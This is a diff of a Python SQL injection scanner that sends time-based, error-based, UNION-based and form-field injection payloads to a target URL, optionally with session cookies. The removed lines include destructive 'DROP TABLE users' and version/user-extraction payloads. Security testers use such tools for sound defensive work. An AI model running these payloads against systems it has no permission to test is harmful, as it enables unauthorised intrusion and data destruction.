@@ -1,19 +1,14 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# sql_scanner.py - SQL injection vulnerability scanner
-
 import sys
 import json
 import requests
 import time
 import re
-import random
 import argparse
 from urllib.parse import urljoin, urlparse, parse_qs
 from bs4 import BeautifulSoup
 
 class AdvancedSQLiScanner:
-    def __init__(self, target_url, custom_params=None):
+    def __init__(self, target_url, custom_params=None, cookies=None, headers=None):
         self.target_url = target_url
         self.custom_params = custom_params or []
         self.session = requests.Session()
@@ -21,6 +16,21 @@ class AdvancedSQLiScanner:
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         })
         self.results = []
+        
+        # Handle cookies for authentication
+        if cookies:
+            for cookie in cookies.split(';'):
+                if '=' in cookie:
+                    name, value = cookie.strip().split('=', 1)
+                    self.session.cookies.set(name, value)
+        
+        # Handle headers for authentication
+        if headers:
+            try:
+                header_dict = json.loads(headers) if isinstance(headers, str) else headers
+                self.session.headers.update(header_dict)
+            except:
+                pass
         
         # Database-specific error patterns
         self.db_errors = {
@@ -71,11 +81,10 @@ class AdvancedSQLiScanner:
         return 'unknown'
 
     def build_test_url(self, payload, param_name=None):
-        """Build test URL with payload"""
+        """Build test URL with payload - only for actual parameters"""
         parsed = urlparse(self.target_url)
         params = parse_qs(parsed.query)
         
-        # Use provided param_name or custom_params or existing params
         if param_name:
             base_url = self.target_url.split('?')[0]
             return f"{base_url}?{param_name}={payload}"
@@ -88,57 +97,56 @@ class AdvancedSQLiScanner:
             base_url = self.target_url.split('?')[0]
             return f"{base_url}?{param_name}={payload}"
         else:
-            # Use common parameter names
-            common_params = ['id', 'user_id', 'product_id', 'page', 'category', 'item']
-            param_name = random.choice(common_params)
-            return f"{self.target_url}{'&' if '?' in self.target_url else '?'}{param_name}={payload}"
+            return None
 
     def time_based_sqli_scan(self):
         """Time-based blind SQL injection scan"""
         time_payloads = {
             'mysql': [
                 "1' AND SLEEP(5)-- ",
-                "1\" AND SLEEP(5)-- ",
                 "1 AND SLEEP(5)-- ",
-                "1' AND (SELECT * FROM (SELECT SLEEP(5))x)-- "
             ],
             'postgresql': [
                 "1' AND pg_sleep(5)-- ",
-                "1\" AND pg_sleep(5)-- "
             ],
             'mssql': [
                 "1'; WAITFOR DELAY '00:00:05'-- ",
-                "1\"; WAITFOR DELAY '00:00:05'-- "
-            ],
-            'oracle': [
-                "1' AND (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)>0-- "
             ]
         }
         
         # Determine which parameters to test
-        params_to_test = self.custom_params if self.custom_params else ['id']
+        params_to_test = []
+        parsed = urlparse(self.target_url)
+        url_params = parse_qs(parsed.query)
         
-        print(f"[INFO] Testing time-based SQL injection on params: {params_to_test}", file=sys.stderr)
+        if self.custom_params:
+            params_to_test = self.custom_params
+            print(f"[INFO] Testing time-based SQL injection on custom params: {params_to_test}", file=sys.stderr)
+        elif url_params:
+            params_to_test = list(url_params.keys())
+            print(f"[INFO] Testing time-based SQL injection on URL params: {params_to_test}", file=sys.stderr)
+        else:
+            print(f"[INFO] No parameters found for time-based SQL injection testing", file=sys.stderr)
+            return
         
         for param in params_to_test:
             for db_type, payloads in time_payloads.items():
                 for payload in payloads:
                     try:
                         test_url = self.build_test_url(payload, param)
+                        if not test_url:
+                            continue
                         
                         start_time = time.time()
-                        response = self.session.get(test_url, timeout=10)
+                        response = self.session.get(test_url, timeout=10, allow_redirects=False)
                         response_time = time.time() - start_time
                         
-                        # Check if response time indicates vulnerability
-                        vulnerable = response_time > 4.5
+                        # Check for login redirect
+                        if response.status_code == 302 and 'login' in response.headers.get('Location', '').lower():
+                            print(f"[WARNING] Redirected to login page", file=sys.stderr)
+                            continue
                         
-                        if vulnerable:
-                            severity = self.calculate_severity(response_time, 'time-based')
-                            confidence = min(95, int((response_time / 5.0) * 100))
-                        else:
-                            severity = None
-                            confidence = 0
+                        vulnerable = response_time > 4.5
                         
                         self.results.append({
                             'payload': payload,
@@ -147,16 +155,14 @@ class AdvancedSQLiScanner:
                             'parameter': param,
                             'url': test_url,
                             'responseTime': int(response_time * 1000),
-                            'databaseType': db_type,
+                            'databaseType': db_type if vulnerable else None,
                             'injectionType': 'time-blind',
-                            'severity': severity,
-                            'confidence': confidence,
-                            'evidence': f"Response time: {response_time:.2f}s" if vulnerable else None,
-                            'recommendation': "Use parameterized queries or prepared statements" if vulnerable else None
+                            'severity': 'high' if vulnerable else None,
+                            'confidence': min(95, int((response_time / 5.0) * 100)) if vulnerable else 0,
+                            'evidence': f"Response time: {response_time:.2f}s" if vulnerable else None
                         })
                         
-                        # Avoid too frequent requests
-                        time.sleep(1)
+                        time.sleep(0.5)
                         
                     except Exception as e:
                         self.results.append({
@@ -164,48 +170,44 @@ class AdvancedSQLiScanner:
                             'vulnerable': False,
                             'method': 'time-based',
                             'parameter': param,
-                            'error': str(e),
-                            'databaseType': db_type
+                            'error': str(e)
                         })
 
     def error_based_sqli_scan(self):
         """Error-based SQL injection scan"""
         error_payloads = [
             "'",
-            "\"",
-            "1'",
-            "1\"",
-            "1' OR '1'='1",
-            "1\" OR \"1\"=\"1",
-            "' UNION SELECT NULL-- ",
-            "\" UNION SELECT NULL-- ",
-            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- ",
-            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
-            "'; DROP TABLE users-- ",
-            "\"; DROP TABLE users-- "
+            "' OR '1'='1",
+            "1' AND '1'='2",
+            "' UNION SELECT NULL-- "
         ]
         
-        params_to_test = self.custom_params if self.custom_params else ['id']
+        params_to_test = []
+        parsed = urlparse(self.target_url)
+        url_params = parse_qs(parsed.query)
         
-        print(f"[INFO] Testing error-based SQL injection on params: {params_to_test}", file=sys.stderr)
+        if self.custom_params:
+            params_to_test = self.custom_params
+        elif url_params:
+            params_to_test = list(url_params.keys())
+        else:
+            print(f"[INFO] No parameters found for error-based SQL injection testing", file=sys.stderr)
+            return
         
         for param in params_to_test:
             for payload in error_payloads:
                 try:
                     test_url = self.build_test_url(payload, param)
-                    response = self.session.get(test_url, timeout=8)
+                    if not test_url:
+                        continue
+                        
+                    response = self.session.get(test_url, timeout=8, allow_redirects=False)
+                    
+                    if response.status_code == 302 and 'login' in response.headers.get('Location', '').lower():
+                        continue
                     
                     db_type = self.detect_database_type(response.text)
                     vulnerable = db_type != 'unknown'
-                    
-                    if vulnerable:
-                        severity = self.calculate_severity_by_payload(payload)
-                        confidence = 90 if 'DROP TABLE' in payload else 80
-                        error_evidence = self.extract_sql_error(response.text)
-                    else:
-                        severity = None
-                        confidence = 0
-                        error_evidence = None
                     
                     self.results.append({
                         'payload': payload,
@@ -213,12 +215,11 @@ class AdvancedSQLiScanner:
                         'method': 'error-based',
                         'parameter': param,
                         'url': test_url,
-                        'databaseType': db_type,
+                        'databaseType': db_type if vulnerable else None,
                         'injectionType': 'string' if "'" in payload else 'numeric',
-                        'severity': severity,
-                        'confidence': confidence,
-                        'evidence': error_evidence,
-                        'recommendation': "Use parameterized queries and filter special characters" if vulnerable else None
+                        'severity': 'high' if vulnerable else None,
+                        'confidence': 90 if vulnerable else 0,
+                        'evidence': self.extract_sql_error(response.text) if vulnerable else None
                     })
                     
                 except Exception as e:
@@ -230,189 +231,133 @@ class AdvancedSQLiScanner:
                         'error': str(e)
                     })
 
-    def boolean_based_sqli_scan(self):
-        """Boolean-based blind SQL injection scan"""
-        try:
-            # Get normal response as baseline
-            normal_response = self.session.get(self.target_url, timeout=5)
-            normal_length = len(normal_response.text)
-            normal_status = normal_response.status_code
-            
-            boolean_tests = [
-                {
-                    'true_payload': "1' AND '1'='1",
-                    'false_payload': "1' AND '1'='2",
-                    'description': 'String-based boolean injection'
-                },
-                {
-                    'true_payload': "1 AND 1=1",
-                    'false_payload': "1 AND 1=2", 
-                    'description': 'Numeric-based boolean injection'
-                },
-                {
-                    'true_payload': "1' OR '1'='1",
-                    'false_payload': "1' AND '1'='2",
-                    'description': 'OR-based boolean injection'
-                }
-            ]
-            
-            params_to_test = self.custom_params if self.custom_params else ['id']
-            
-            print(f"[INFO] Testing boolean-based SQL injection", file=sys.stderr)
-            
-            for param in params_to_test:
-                for test in boolean_tests:
-                    try:
-                        # Test TRUE condition
-                        true_url = self.build_test_url(test['true_payload'], param)
-                        true_response = self.session.get(true_url, timeout=5)
-                        
-                        # Test FALSE condition
-                        false_url = self.build_test_url(test['false_payload'], param)
-                        false_response = self.session.get(false_url, timeout=5)
-                        
-                        # Compare responses
-                        true_length = len(true_response.text)
-                        false_length = len(false_response.text)
-                        
-                        length_diff = abs(true_length - false_length)
-                        status_diff = true_response.status_code != false_response.status_code
-                        
-                        # Check if responses are different
-                        vulnerable = length_diff > 100 or status_diff
-                        
-                        if vulnerable:
-                            severity = 'medium' if length_diff > 500 else 'low'
-                            confidence = min(85, int((length_diff / 1000) * 100) + 30)
-                        else:
-                            severity = None
-                            confidence = 0
-                        
-                        self.results.append({
-                            'payload': f"True: {test['true_payload']}, False: {test['false_payload']}",
-                            'vulnerable': vulnerable,
-                            'method': 'boolean-based',
-                            'parameter': param,
-                            'injectionType': 'blind',
-                            'severity': severity,
-                            'confidence': confidence,
-                            'evidence': f"Length diff: {length_diff}, Status diff: {status_diff}" if vulnerable else None,
-                            'recommendation': "Implement strict input validation and parameterized queries" if vulnerable else None
-                        })
-                        
-                    except Exception as e:
-                        self.results.append({
-                            'payload': test['description'],
-                            'vulnerable': False,
-                            'method': 'boolean-based',
-                            'parameter': param,
-                            'error': str(e)
-                        })
-            
-        except Exception as e:
-            self.results.append({
-                'payload': 'boolean-based-scan',
-                'vulnerable': False,
-                'method': 'boolean-based',
-                'error': f"Base request failed: {str(e)}"
-            })
-
     def union_based_sqli_scan(self):
         """UNION-based SQL injection scan"""
-        params_to_test = self.custom_params if self.custom_params else ['id']
+        params_to_test = []
+        parsed = urlparse(self.target_url)
+        url_params = parse_qs(parsed.query)
         
-        print(f"[INFO] Testing UNION-based SQL injection", file=sys.stderr)
+        if self.custom_params:
+            params_to_test = self.custom_params
+        elif url_params:
+            params_to_test = list(url_params.keys())
+        else:
+            print(f"[INFO] No parameters found for UNION-based SQL injection testing", file=sys.stderr)
+            return
         
         for param in params_to_test:
-            # First determine number of columns
-            column_detection_payloads = [
-                "1' ORDER BY 1-- ",
-                "1' ORDER BY 2-- ",
-                "1' ORDER BY 3-- ",
-                "1' ORDER BY 4-- ",
-                "1' ORDER BY 5-- ",
-                "1' ORDER BY 10-- ",
-                "1' ORDER BY 20-- "
-            ]
-            
-            detected_columns = 0
-            
-            # Detect columns
-            for i, payload in enumerate(column_detection_payloads, 1):
+            # Test for number of columns
+            for i in range(1, 8):
+                null_string = ','.join(['NULL'] * i)
+                payload = f"1' UNION SELECT {null_string}-- "
+                
                 try:
                     test_url = self.build_test_url(payload, param)
-                    response = self.session.get(test_url, timeout=5)
+                    if not test_url:
+                        continue
                     
-                    # If no error, columns count is at least this many
+                    response = self.session.get(test_url, timeout=5, allow_redirects=False)
+                    
+                    if response.status_code == 302:
+                        continue
+                    
+                    # Check if UNION was successful (no SQL error)
                     if not self.has_sql_error(response.text):
-                        detected_columns = i
-                    else:
-                        break
-                        
-                except Exception:
-                    break
-            
-            # UNION attack based on detected columns
-            if detected_columns > 0:
-                null_string = ','.join(['NULL'] * detected_columns)
-                union_payloads = [
-                    f"1' UNION SELECT {null_string}-- ",
-                    f"1\" UNION SELECT {null_string}-- ",
-                    f"-1' UNION SELECT {null_string}-- ",
-                    f"1' UNION ALL SELECT {null_string}-- "
-                ]
-                
-                # Try to extract database info
-                if detected_columns > 0:
-                    info_payloads = [
-                        f"1' UNION SELECT version(),{','.join(['NULL'] * (detected_columns-1))}-- " if detected_columns > 0 else "",
-                        f"1' UNION SELECT user(),{','.join(['NULL'] * (detected_columns-1))}-- " if detected_columns > 0 else "",
-                        f"1' UNION SELECT database(),{','.join(['NULL'] * (detected_columns-1))}-- " if detected_columns > 0 else ""
-                    ]
-                    union_payloads.extend([p for p in info_payloads if p])
-                
-                for payload in union_payloads:
-                    try:
-                        test_url = self.build_test_url(payload, param)
-                        response = self.session.get(test_url, timeout=5)
-                        
-                        # Check if UNION was successful
-                        vulnerable = not self.has_sql_error(response.text) and len(response.text) > 0
-                        
-                        if vulnerable:
-                            severity = 'high'  # UNION injection is usually high severity
-                            confidence = 85
-                            evidence = self.extract_union_data(response.text)
-                        else:
-                            severity = None
-                            confidence = 0
-                            evidence = None
-                        
                         self.results.append({
                             'payload': payload,
-                            'vulnerable': vulnerable,
+                            'vulnerable': True,
                             'method': 'union-based',
                             'parameter': param,
+                            'url': test_url,
                             'injectionType': 'union',
-                            'severity': severity,
-                            'confidence': confidence,
-                            'evidence': evidence,
-                            'recommendation': "Immediately fix SQL injection vulnerability and review all database queries" if vulnerable else None
+                            'severity': 'high',
+                            'confidence': 85
                         })
+                        break  # Found the right number of columns
                         
-                    except Exception as e:
-                        self.results.append({
-                            'payload': payload,
-                            'vulnerable': False,
-                            'method': 'union-based',
-                            'parameter': param,
-                            'error': str(e)
-                        })
+                except Exception as e:
+                    pass
+
+    def scan_forms(self):
+        """Scan forms for SQL injection"""
+        try:
+            response = self.session.get(self.target_url, timeout=10, allow_redirects=True)
+            
+            if 'login' in response.url.lower() and 'login' not in self.target_url.lower():
+                print(f"[ERROR] Redirected to login page", file=sys.stderr)
+                return
+            
+            soup = BeautifulSoup(response.content, 'html.parser')
+            forms = soup.find_all('form')
+            
+            if len(forms) == 0:
+                return
+            
+            sql_payloads = ["'", "' OR '1'='1"]
+            
+            for idx, form in enumerate(forms):
+                action = form.get('action', '')
+                method = form.get('method', 'get').lower()
+                
+                if not action or action == '#':
+                    form_url = self.target_url.split('?')[0]
+                else:
+                    form_url = urljoin(self.target_url, action)
+                
+                inputs = form.find_all(['input', 'textarea', 'select'])
+                form_data = {}
+                testable_fields = []
+                
+                for input_field in inputs:
+                    name = input_field.get('name')
+                    if name:
+                        input_type = input_field.get('type', 'text')
+                        if input_type == 'submit':
+                            form_data[name] = input_field.get('value', 'Submit')
+                        elif input_type not in ['button', 'reset']:
+                            form_data[name] = 'test'
+                            testable_fields.append(name)
+                
+                for field_name in testable_fields:
+                    for payload in sql_payloads:
+                        test_data = form_data.copy()
+                        test_data[field_name] = payload
+                        
+                        try:
+                            if method == 'post':
+                                resp = self.session.post(form_url, data=test_data, timeout=10)
+                            else:
+                                resp = self.session.get(form_url, params=test_data, timeout=10)
+                            
+                            db_type = self.detect_database_type(resp.text)
+                            vulnerable = db_type != 'unknown'
+                            
+                            self.results.append({
+                                'payload': payload,
+                                'vulnerable': vulnerable,
+                                'method': f'form_{method}',
+                                'field': field_name,
+                                'url': form_url,
+                                'databaseType': db_type if vulnerable else None,
+                                'severity': 'high' if vulnerable else None,
+                                'confidence': 85 if vulnerable else 0
+                            })
+                            
+                        except Exception as e:
+                            self.results.append({
+                                'payload': payload,
+                                'vulnerable': False,
+                                'method': f'form_{method}',
+                                'field': field_name,
+                                'error': str(e)
+                            })
+                            
+        except Exception as e:
+            print(f"[ERROR] Form scan failed: {str(e)}", file=sys.stderr)
 
     def has_sql_error(self, response_text):
         """Check if response contains SQL errors"""
         response_lower = response_text.lower()
-        
         for db_type, patterns in self.db_errors.items():
             for pattern in patterns:
                 if re.search(pattern, response_lower):
@@ -422,107 +367,63 @@ class AdvancedSQLiScanner:
     def extract_sql_error(self, response_text):
         """Extract SQL error message"""
         response_lower = response_text.lower()
-        
         for db_type, patterns in self.db_errors.items():
             for pattern in patterns:
                 match = re.search(pattern, response_lower)
                 if match:
-                    # Return error context
                     start = max(0, match.start() - 50)
                     end = min(len(response_text), match.end() + 50)
                     return response_text[start:end].strip()
         return None
-
-    def extract_union_data(self, response_text):
-        """Extract data from UNION query results"""
-        patterns = [
-            r'version\(\)[^<]*(\d+\.\d+\.\d+)',
-            r'user\(\)[^<]*([a-zA-Z0-9@._-]+)',
-            r'database\(\)[^<]*([a-zA-Z0-9_-]+)'
-        ]
-        
-        extracted_data = []
-        for pattern in patterns:
-            match = re.search(pattern, response_text, re.IGNORECASE)
-            if match:
-                extracted_data.append(match.group(1))
-        
-        return ', '.join(extracted_data) if extracted_data else None
-
-    def calculate_severity(self, response_time, method):
-        """Calculate severity based on response time"""
-        if method == 'time-based':
-            if response_time > 8:
-                return 'critical'
-            elif response_time > 6:
-                return 'high'
-            elif response_time > 4.5:
-                return 'medium'
-        return 'low'
-
-    def calculate_severity_by_payload(self, payload):
-        """Calculate severity based on payload"""
-        if 'DROP TABLE' in payload.upper():
-            return 'critical'
-        elif 'UNION' in payload.upper():
-            return 'high'
-        elif any(x in payload for x in ["'", '"']):
-            return 'medium'
-        return 'low'
 
     def run_scan(self):
         """Run complete SQL injection scan"""
         try:
             print(f"[INFO] Starting SQL injection scan for: {self.target_url}", file=sys.stderr)
             
-            if self.custom_params:
-                print(f"[INFO] Using custom parameters: {self.custom_params}", file=sys.stderr)
+            # Check access
+            test_response = self.session.get(self.target_url, timeout=10, allow_redirects=True)
+            if 'login' in test_response.url.lower() and 'login' not in self.target_url.lower():
+                print(f"[ERROR] Target URL redirects to login. Please provide valid session cookies.", file=sys.stderr)
+                return []
             
-            # 1. Error-based detection
-            self.error_based_sqli_scan()
+            parsed = urlparse(self.target_url)
+            url_params = parse_qs(parsed.query)
             
-            # 2. Time-based blind detection
-            self.time_based_sqli_scan()
+            # Only run parameter-based tests if we have parameters
+            if self.custom_params or url_params:
+                self.error_based_sqli_scan()
+                self.time_based_sqli_scan()
+                self.union_based_sqli_scan()
+            else:
+                print(f"[INFO] No URL parameters found, checking for forms", file=sys.stderr)
             
-            # 3. Boolean-based blind detection
-            self.boolean_based_sqli_scan()
-            
-            # 4. UNION-based detection
-            self.union_based_sqli_scan()
+            # Always scan forms if they exist
+            self.scan_forms()
             
             print(f"[INFO] Scan completed. Total tests: {len(self.results)}", file=sys.stderr)
             
         except Exception as e:
-            self.results.append({
-                'payload': 'general_scan',
-                'vulnerable': False,
-                'error': f'General scan error: {str(e)}',
-                'method': 'error'
-            })
+            print(f"[ERROR] Scan failed: {str(e)}", file=sys.stderr)
         
         return self.results
 
 def main():
-    # Parse command line arguments
     parser = argparse.ArgumentParser(description='Advanced SQL Injection Scanner')
     parser.add_argument('url', help='Target URL to scan')
-    parser.add_argument('--params', 
-                       help='Comma-separated list of parameters to test',
-                       default='')
+    parser.add_argument('--params', help='Comma-separated list of parameters', default='')
+    parser.add_argument('--cookies', help='Cookies for authentication', default='')
+    parser.add_argument('--headers', help='Headers for authentication (JSON format)', default='')
     
     args = parser.parse_args()
     
-    # Process parameters
     custom_params = []
     if args.params:
         custom_params = [p.strip() for p in args.params.split(',') if p.strip()]
-        print(f"[DEBUG] Received params from TypeScript: {custom_params}", file=sys.stderr)
     
-    # Create scanner and run
-    scanner = AdvancedSQLiScanner(args.url, custom_params)
+    scanner = AdvancedSQLiScanner(args.url, custom_params, args.cookies, args.headers)
     results = scanner.run_scan()
     
-    # Output JSON results
     print(json.dumps(results, indent=2))
 
 if __name__ == "__main__":
